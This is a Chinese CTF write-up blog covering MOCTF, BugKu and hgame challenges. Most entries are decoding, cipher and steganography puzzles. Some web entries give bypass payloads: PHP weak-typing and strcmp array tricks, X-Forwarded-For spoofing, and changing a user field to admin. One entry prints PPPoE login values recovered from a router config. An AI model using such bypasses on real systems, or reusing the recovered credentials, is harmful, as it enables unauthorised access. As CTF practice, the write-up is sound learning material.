发现flag就在这里。1flag：moctf&#123;20180202mqlsys&#125; 哇，有毒吧同样是安卓逆向，用apktoolbox进行jadx，关注这段源码1234567891011121314151617public void check(String name, String pass) &#123; if (name.equals(&quot;MQLSY_s&quot;) &amp;&amp; pass.equals(&quot;66666&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7dGhlX0NURl9JU18/fQ==&quot;, 0).show(); &#125; else if (name.equals(&quot;mqlsys&quot;) &amp;&amp; pass.equals(&quot;23333&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7ZmFsc2U/fQ==&quot;, 0).show(); &#125; else if (name.equals(BuildConfig.FLAVOR) &amp;&amp; pass.equals(BuildConfig.FLAVOR)) &#123; Toast.makeText(this, &quot;\u54c7\uff0c\u8fd9\u4f60\u90fd\u6562\u5c1d\u8bd5\uff0c\u5389\u5bb3\u5389\u5bb3&quot;, 0).show(); &#125; else if (name.equals(&quot;MQL&quot;) &amp;&amp; pass.equals(&quot;2018&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7dGhpc19pc24ndF9mbGFnfQ==&quot;, 0).show(); &#125; else if (name.equals(&quot;admin&quot;) &amp;&amp; pass.equals(&quot;admin&quot;)) &#123; Toast.makeText(this, &quot;\u767b\u5f55\u6210\u529f&quot;, 0).show(); &#125; else if (name.equals(&quot;MQL&quot;) &amp;&amp; pass.equals(&quot;666&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7dHJ1ZT99&quot;, 0).show(); &#125; else &#123; Toast.makeText(this, &quot;\u767b\u5f55\u5931\u8d25&quot;, 0).show(); &#125; &#125; 里面的几个判断语句都有name和pass,解码pass看到1234567moctf&#123;the_CTF_IS_?&#125;moctf&#123;false?&#125;哇，这你都敢尝试，厉害厉害moctf&#123;this_isn&apos;t_flag&#125;登录成功moctf&#123;true?&#125;登录失败 想试下这些能不能过，结果第一个就是我们所要的flag(脑洞有点大，老年人跟不上)。1flag：moctf&#123;the_CTF_IS_?&#125; MISC篇流量分析得到的是一个流量包，用wireshark打开看一下，发现应该是路由器配置过程的流量包，我们追踪TCP流可以看到flag。1flag: moctf&#123;c@N_y0U_4lnd_m8&#125; base全家桶得到这样一个字符串14D4A4C545332544549354E444F554C4E495A35465556525A4B4A53464F5254564C4159484134435A4B5934564B595253475658474D554A3548553D3D3D3D3D3D 全家桶应该指的是base16、base32、base64，直接用py可以解码，根据字符串特征选择解码方式，顺序是：base16—-base32——base6412345678910&gt;&gt;&gt; import base64&gt;&gt;&gt; decode = base64.b16decode(b&apos;4D4A4C545332544549354E444F554C4E495A35465556525A4B4A53464F5254564C4159484134435A4B5934564B595253475658474D554A3548553D3D3D3D3D3D&apos;)&gt;&gt;&gt; decodeb&apos;MJLTS2TEI5NDOULNIZ5FUVRZKJSFORTVLAYHA4CZKY4VKYRSGVXGMUJ5HU======&apos;&gt;&gt;&gt; decode = base64.b32decode(b&apos;MJLTS2TEI5NDOULNIZ5FUVRZKJSFORTVLAYHA4CZKY4VKYRSGVXGMUJ5HU======&apos;)&gt;&gt;&gt; decodeb&apos;bW9jdGZ7QmFzZV9RdWFuX0ppYV9Ub25nfQ==&apos;&gt;&gt;&gt; decode = base64.b64decode(b&apos;bW9jdGZ7QmFzZV9RdWFuX0ppYV9Ub25nfQ==&apos;)&gt;&gt;&gt; decodeb&apos;moctf&#123;Base_Quan_Jia_Tong&#125;&apos; 颜文字得到这样一串颜文字：1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;); 直接放控制台，回车后就可以得到flag。1flag:moctf&#123;Yan_Wen_Zi&#125; 奇怪的十六进制得到一串16进制：15a 45 64 6f 63 45 35 57 4f 48 68 6a 4d 54 6c 74 59 6b 64 46 4e 51 3d 3d 转换成ASCII转换地址：http://www.ab126.com/goju/1711.html1Z E d o c E 5 W O H h j M T l t Y k d F N Q = = 同样我们用python解码一下base64得到flag；123456&gt;&gt;&gt; decode = base64.b64decode(b&apos;ZEdocE5WOHhjMTltYkdFNQ==&apos;)&gt;&gt;&gt; decodeb&apos;dGhpNV8xc19mbGE5&apos;&gt;&gt;&gt; decode = base64.b64decode(b&apos;dGhpNV8xc19mbGE5&apos;)&gt;&gt;&gt; decodeb&apos;thi5_1s_fla9&apos; 先越过这道栅栏再说我们得到字符串为：1nzop0edv_u_1ggu&#123;1&#125; 题目提示栅栏密码，我们用CTFcrackTools看一下1第2栏：npdug&#123;z0v_g1oe_1u&#125; 再用凯撒密码解一下得到flag。1moctf&#123;y0u_f1nd_1t&#125; 空word得到一个空的word文本，这里想到前天刚做的Bugku的题目也是类似，通过显示全部格式标记，我们可以看到一些符号猜测是摩斯密码，我们整理出来后得到1-.... -.. -.... ..-. -.... ...-- --... ....- -.... -.... --... -... ....- ..--- -.... -.-. ...-- ....- -.... . -.... -... ..... ..-. ...-- ----- --... ..--- ..... ..-. --... ....- -.... .---- -.... ..--- ...-- ..-. --... -.. 解密后得到十六进制，转成ASCII后，得到flag。转换地址：http://www.ab126.com/goju/1711.html1236D6F6374667B426C346E6B5F30725F7461623F7Dmoctf&#123;Bl4nk_0r_tab?&#125; 一万年的爱有多久下载后得到一个压缩包，试着解压后，还是压缩包，结合题目应该是要不断解压才能看到flag，这里直接用python脚本来实现解压缩包：123456789101112import zipfileimport osfor i in range(10000): file_list = os.listdir(r&apos;.&apos;) for file_name in file_list: if os.path.splitext(file_name)[1] == &apos;.zip&apos;: file_zip = zipfile.ZipFile(file_name, &apos;r&apos;) for file in file_zip.namelist(): file_zip.extract(file, r&apos;.&apos;) file_zip.close() os.remove(file_name) 解压完得到flag文件，用编辑器打开可得到flag。1flag:moctf&#123;Just_a_few_minutes&#125; 是兄弟就来干我得到一张tanwanlanyue.png和一个压缩包,用binwalk看了一下都没东西，用Stegsolve打开，试了一下lsb隐写，在BGR排序下看到是一张png图片 我们把他保存成bin文件，然后用winhex打开，发现文件头不对，删掉多余的字符，然后保存 得到一张图片 我们猜测压缩包密码就是图片上用红点表示的内容(zhazhahui)，发现能打开压缩包，得到1f_hfv7m_y8&#123;kThk43a_xrk0?n&#125; 先用栅栏密码解密，再用凯撒密码解密可得到flag。1234第1栏：fhvmy&#123;Tk3_r0n_f7_8kh4axk?&#125;第2栏：fh_kh4f3va7_mx_ryk80&#123;?knT&#125;使用第一栏进行凯撒解密moctf&#123;Ar3_y0u_m7_8ro4her?&#125; Hacker!!!得到一个流量包，用wireshark查看后发现是以一个注入的流量，这里参考了cankao1这篇文章，先导出http对象，然后分析是盲注，当长度1326时正确，所以把一个一个把返回正常所对应的ASCII编码后的数字找出来1109 111 99 116 102 123 72 116 116 112 95 49 115 95 100 52 110 103 51 114 73 48 117 53 125 对着ASCII表解码一下可以得到flag。1flag:moctf&#123;Http_1s_d4ng3rI0u5&#125; 李华的疑惑得到一个压缩包，解压后有一个压缩包和一个password.txt，password.txt有规律的排列,均为3个一组，一共22500行 这里想到可能是代表RGB三个通道，可以试着能不能按照150X150还原图片，这里参考了http://blog.csdn.net/ssjjtt1997/article/details/78450816使用python的PIL进行图片还原1234567891011121314151617from PIL import Imagex = 150 #x坐标 通过对txt里的行数进行整数分解y = 150 #y坐标 x * y = 行数im = Image.new(&quot;RGB&quot;, (x, y)) #创建图片file = open(&apos;password.txt&apos;) #打开rbg值的文件#通过每个rgb点生成图片for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 rgb = line.split(&quot;,&quot;) #分离rgb，文本中逗号后面有空格 im.putpixel((i,j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) #将rgb转化为像素im.save(&apos;flag.jpg&apos;) 得到flag.jpg 得到密码解开压缩包得到字符串1U2FsdGVkX18R9EylBVacP/j0XpCISh9nZth6TFwoh5GUv0edeVp3ZV9gXVqd/rlH66OIZgSHn2Mock4hcdqFEg== 试了一下base64，发现不行，这里想到之前好像见过类似的使用AES进行解密，这里一个在线解密地址http://tool.oschina.net/encrypt来解密，可以得到flag。1flag:moctf&#123;D0_You_1ik3_tO_pAinH_wi4h_pi8e1&#125; 签到签到题目问的是集五福能平分多少钱，打开支付宝开了一下，发现是五亿，结合题目的提示，可得flag。1flag: moctf&#123;500000000&#125;]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu新赛季（持续更新）]]></title>
    <url>%2F2018%2F02%2F11%2FBugKu%E6%96%B0%E8%B5%9B%E5%AD%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89%2F</url>
    <content type="text"><![CDATA[BugKu新赛季题目地址：http://ctf.bugku.com/challenges 杂项签到题关注BugKu的微信公众号即可获取flag； 这是一张单纯的图片下载图片用winhex打开，可以看到末尾有一段奇怪的字符串1#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125; 第一直觉用ASCII表来对照一下，发现就是我们所要的flag； 隐写首先打开图片看一下，发现像素是500X420，这里想到可能是png像素隐写，这里参考余老师的一篇文章png像素隐写我们用winhex将像素调整为500X500后，可以在图片下方得到我们所要的flag； telnet这是一个流量分析题，用wireshark打开流量包分析，发现这是一个登陆的过程，flag是password，所以找到输入的password，我们可以得到flag；123456Frame 41: 92 bytes on wire (736 bits), 92 bytes captured (736 bits)Ethernet II, Src: Vmware_84:86:5f (00:0c:29:84:86:5f), Dst: Vmware_26:7e:0e (00:0c:29:26:7e:0e)Internet Protocol Version 4, Src: 192.168.221.128, Dst: 192.168.221.164Transmission Control Protocol, Src Port: 1146, Dst Port: 23, Seq: 83, Ack: 124, Len: 38Telnet Data: flag&#123;d316759c281bf925d600be698a4973d5&#125; 眼见非实（ISCCCTF）下载下来发现在win下打不来，但是文件名提示是zip，应该是一个压缩包，这里我直接把文件放到kali里面打开，得到一些.xml的文件，一个个看过去，在document.xml里面找到了flag；123456789101112131415161718192021222324-&lt;w:p w:rsidRDefault=&quot;002B3D8D&quot; w:rsidR=&quot;002B3D8D&quot;&gt;-&lt;w:r&gt;&lt;w:t&gt;Flag&lt;/w:t&gt;&lt;/w:r&gt;-&lt;w:r&gt;&lt;w:t&gt;在这里呦！&lt;/w:t&gt;&lt;/w:r&gt;&lt;/w:p&gt;-&lt;w:p w:rsidRDefault=&quot;002B3D8D&quot; w:rsidR=&quot;002B3D8D&quot; w:rsidRPr=&quot;002B3D8D&quot;&gt;-&lt;w:pPr&gt;-&lt;w:rPr&gt;&lt;w:rFonts w:hint=&quot;eastAsia&quot;/&gt;&lt;w:vanish/&gt;&lt;/w:rPr&gt;&lt;/w:pPr&gt;-&lt;w:r w:rsidRPr=&quot;002B3D8D&quot;&gt;-&lt;w:rPr&gt;&lt;w:vanish/&gt;&lt;/w:rPr&gt;&lt;w:t&gt;flag&#123;F1@g&#125;&lt;/w:t&gt;&lt;/w:r&gt;&lt;w:bookmarkStart w:name=&quot;_GoBack&quot; w:id=&quot;0&quot;/&gt;&lt;w:bookmarkEnd w:id=&quot;0&quot;/&gt;&lt;/w:p&gt; 又一张图片，还单纯吗下载图片，用binwalk看一下，发现有多个文件，用foremost命令分离出来，发现flag就在分离出来的图片上； 猜有点儿脑洞，题目给了一张只有一半头像的图片，让我们猜这个人的名字，这里我直接用百度图片的搜索功能找出这个人就是刘亦菲，flag get； 宽带信息泄露下载得到一个bin文件，应该是一个配置文件，我们用路由器配置查看器查看bin文件工具下载地址：http://www.ouyaoxiazai.com/soft/llrj/55/18061.html#dizhi打开配置文件可以直接搜索一下username或者password，即可得到flag。1234567891011&lt;WANPPPConnection instance=1 &gt; &lt;Enable val=1 /&gt; &lt;DefaultGateway val=10.177.144.1 /&gt; &lt;Name val=pppoe_eth1_d /&gt; &lt;Uptime val=671521 /&gt; &lt;Username val=053700357621 /&gt; &lt;Password val=210265 /&gt; &lt;X_TP_IfName val=ppp0 /&gt; &lt;X_TP_L2IfName val=eth1 /&gt; &lt;X_TP_ConnectionId val=1 /&gt; &lt;ExternalIPAddress val=10.177.150.82 /&gt; 隐写2得到一张图片，用binwalk分析一下，有一个压缩包，分离出来后图片上提示压缩包密码3位数，所以直接暴力破解，密码是871，解压后是一张3.jpg的图片，用winhex打开，在末尾看到一串字符1f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125; 直接提交发现不对，然后对flag里面的字符串进行base64解码，得到123\x79 \x30 \x75 \x20 \x41 \x72 \x65 \x20 \x61 \x20 \x68 \x40 \x63 \x6b \x65 \x72 \x21 接着我们将其转换成ASCII，在线转换地址：http://www.ab126.com/goju/1711.html,可以得到flag； 123\y \0 \u \ \A \r \e \ \a \ \h \@ \c \k \e \r \! 这里提交的时候要把前面的f1@g改成flag，我也是试了几次才对的。 多种方法解决下载得到一个exe文件，无法运行，妖魔化winhex打开发现是一串base64编码，这里用base64转图片地址：http://tool.chinaz.com/tools/imgtobase可以得到一张二维码，直接扫一扫可以得到flag； linux中国菜刀这么多数据包隐写3下载得到一张图片，发现宽和高不太协调，想到png像素隐藏，参考余老师的一篇文章png像素隐写用winhex改一下像素值就可以得到flag。 细心地大象先用binwalk分离出加密压缩包，查看图片属性发现一串字符串在备注1TVNEUzQ1NkFTRDEyM3p6 试了一下密码不对，又base64解码了一下，发现可以解开压缩包，得到另一张图片，这张图片就是用了之前的png像素隐藏，所以修改一下像素就可以得到flag。 ###]]></content>
      <tags>
        <tag>-ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame（week_1）-----未完待续]]></title>
    <url>%2F2018%2F02%2F06%2Fhgame%EF%BC%88weekek-1%EF%BC%89-%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%2F</url>
    <content type="text"><![CDATA[又是一个划水的比赛，又控制不住自己的双手，还是去水了几题，写点东西记录一下吧！！！ week1webAre you from Europe? 打开题目地址，是一个抽奖页面，f12看一下源码 发现有一个getcard的函数，并且SSR的概率极低（0.0000001），我们可以通过重写函数把SSR的概率改为1，通过控制台写入，然后进行抽奖，得到flag：hgame{Th3_Ch0seN_0nE!} special number题目提示PHP弱类型 这里参考了http://www.freebuf.com/articles/web/129607.html这篇文章 然后分析源码 我们还需要绕过正则表达式， 构造payload:http://118.25.18.223:10001/?key=0e000000000000000000000来获取flag（0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换） 提交后即可得到flag：hgame{pHp_w34k_typing_s000_e4sy}。 can u find me? 打开题目地址提示only robot know where is the flag ，我们可以想到robots.txt文件 访问robots.txt可以看到一个/f1aaaaaaaag.php的页面 访问该页面提示only admin can get flag 通过burp抓包改一下user=admin即可得到flag。 tell me what you want根据题目提示提交?want=flag,提示“request method is error.I think POST is better” 改用POST提交，提示“only localhost can get flag” 需要构造X-Forwarded-For: 127.0.0.1来实现本地访问 通过burp修改请求头可以得到flag：hgame{For9e_hTTp_iS_N0T_HArd} 我们不一样代码如下： 12345678if(isset($_POST[&apos;str1&apos;])&amp;&amp;isset($_POST[&apos;str2&apos;]))&#123; if ($_POST[&apos;str1&apos;]!=$_POST[&apos;str2&apos;]&amp;&amp;strcmp($_POST[&apos;str1&apos;],$_POST[&apos;str2&apos;])==0) &#123; echo &quot;flag is:&quot;.$flag; exit(); &#125; else&#123; echo &quot;Something wrong..&quot;; &#125;&#125; 题目提示PHP弱类型，参考http://www.freebuf.com/articles/web/129607.html， 我们的payload：str1=123 &amp; str2[]= POST提交后可得到flag:flag is:hgame{g3t_f14g_is_so0000_ez} rere0 下载得到一个re0.exe,用OD打开，查找所有参考文本字符串，即可得到flag。 baby_crack没做出来QAQ nop_pop没做出来+1QAQ sc2_player同样没做出来QWQ pwn对萌新来说太难了，准备花时间好好学学pwn，以pwn签到题为目标。 misc白菜1 